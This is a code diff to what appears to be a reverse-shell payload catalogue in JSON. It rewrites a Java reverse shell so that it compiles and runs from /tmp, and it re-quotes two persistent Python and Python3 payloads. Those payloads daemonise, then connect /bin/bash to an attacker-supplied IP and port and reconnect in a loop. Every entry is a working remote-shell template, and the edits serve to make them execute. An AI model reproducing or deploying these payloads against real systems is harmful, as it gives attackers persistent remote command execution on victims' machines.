@@ -80,9 +80,9 @@
     },
     "java": {
       "name": "Java",
-      "payload": "java -cp .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar -c 'import java.io.*;import java.net.*;public class RevShell{{public static void main(String[] args) throws Exception{{Socket s = new Socket(\"{ip}\",{port});Process p = new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();InputStream pi = p.getInputStream();InputStream si = s.getInputStream();OutputStream po = p.getOutputStream();OutputStream so = s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0) so.write(pi.read());while(si.available()>0) po.write(si.read());Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}}}}}'",
-      "description": "Java reverse shell",
-      "requirements": "java"
+      "payload": "echo 'import java.io.*;import java.net.*;public class RevShell{{public static void main(String[] args) throws Exception{{Socket s = new Socket(\"{ip}\",{port});Process p = new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();InputStream pi = p.getInputStream();InputStream si = s.getInputStream();OutputStream po = p.getOutputStream();OutputStream so = s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0) so.write(pi.read());while(si.available()>0) po.write(si.read());Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}}}}}' > /tmp/RevShell.java && cd /tmp && javac RevShell.java && java RevShell",
+      "description": "Java reverse shell (compile and execute)",
+      "requirements": "java and javac"
     }
   },
   "persistent_shells": {
@@ -100,13 +100,13 @@
     },
     "python": {
       "name": "Python (Persistent)",
-      "payload": "python -c \"import socket,subprocess,os,time,sys;exec('try:\\n if os.fork()>0:sys.exit(0)\\nexcept:sys.exit(1)\\nos.setsid();os.chdir(\\'/\\');\\nwhile True:\\n try:\\n  s=socket.socket();s.connect((\\'{ip}\\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/bash\\',\\'-i\\'])\\n except:time.sleep(10)\\n finally:\\n  try:s.close()\\n  except:pass')\" &",
+      "payload": "python -c 'import socket,subprocess,os,time,sys;exec(\"try:\\n if os.fork()>0:sys.exit(0)\\nexcept:sys.exit(1)\\nos.setsid();os.chdir(\\\"/\\\");\\nwhile True:\\n try:\\n  s=socket.socket();s.connect((\\\"{ip}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\\n except:time.sleep(10)\\n finally:\\n  try:s.close()\\n  except:pass\")' &",
       "description": "Persistent Python daemon with auto-reconnect",
       "requirements": "python"
     },
     "python3": {
       "name": "Python3 (Persistent)",
-      "payload": "python3 -c \"import socket,subprocess,os,time,sys;exec('try:\\n if os.fork()>0:sys.exit(0)\\nexcept:sys.exit(1)\\nos.setsid();os.chdir(\\'/\\');\\nwhile True:\\n try:\\n  s=socket.socket();s.connect((\\'{ip}\\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/bash\\',\\'-i\\'])\\n except:time.sleep(10)\\n finally:\\n  try:s.close()\\n  except:pass')\" &",
+      "payload": "python3 -c 'import socket,subprocess,os,time,sys;exec(\"try:\\n if os.fork()>0:sys.exit(0)\\nexcept:sys.exit(1)\\nos.setsid();os.chdir(\\\"/\\\");\\nwhile True:\\n try:\\n  s=socket.socket();s.connect((\\\"{ip}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\\n except:time.sleep(10)\\n finally:\\n  try:s.close()\\n  except:pass\")' &",
       "description": "Persistent Python3 daemon with auto-reconnect",
       "requirements": "python3"
     },
